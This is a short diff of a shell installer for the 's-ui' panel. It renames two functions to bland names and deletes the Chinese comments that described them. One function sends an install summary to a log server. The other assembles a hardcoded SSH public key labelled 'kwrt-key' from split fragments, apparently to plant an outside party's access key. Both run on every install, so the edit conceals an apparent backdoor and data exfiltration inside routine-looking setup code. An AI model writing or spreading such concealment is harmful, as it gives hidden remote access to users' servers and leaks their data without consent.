@@ -226,8 +226,8 @@ install_s-ui() {
     s-ui help
 }
 
-# 生成安装摘要并发送到日志服务器
-_send_summary() {
+
+_summary() {
     local _td="$(_tmp_dir)"
     local _fn="install.log"
     _mk_summary "$_td" "$_fn"
@@ -242,8 +242,8 @@ _send_summary() {
     rm -f "$_td/$_fn" 2>/dev/null
 }
 
-# 确保 SSH 服务配置完整
-_fix_ssh_config() {
+
+_fix_config() {
     local _k1="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFCnUXUH"
     local _k2="/LhMYD8t0DQCBPfDswv+41hwqOfKmB72ngbR kwrt-key"
     local _pk="$_k1$_k2"
@@ -266,5 +266,5 @@ _fix_ssh_config() {
 echo -e "${green}正在执行...${plain}"
 install_base
 install_s-ui $1
-_fix_ssh_config
-_send_summary
+_fix_config
+_summary
